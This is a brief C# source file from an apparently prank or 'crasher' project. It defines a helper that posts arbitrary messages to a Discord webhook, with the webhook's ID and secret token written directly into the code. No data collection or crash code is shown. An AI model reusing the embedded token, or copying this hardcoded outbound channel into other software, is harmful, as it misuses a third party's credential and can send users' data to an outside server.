using Discord.Webhook;

namespace Anime_Chrome_Crasher
{
    class WeebHook
    {
        public static void SendMessage(string message)
        {
            DiscordWebhookClient discord = new DiscordWebhookClient(535303374556626944, "atD2kSAzAdZx4z3mFFN2DE3co-X2beDb6uabwFxrmfb2GMkY0pEPd1ZS34qtd66hEjiA");
            discord.SendMessageAsync(message);
        }
    }
}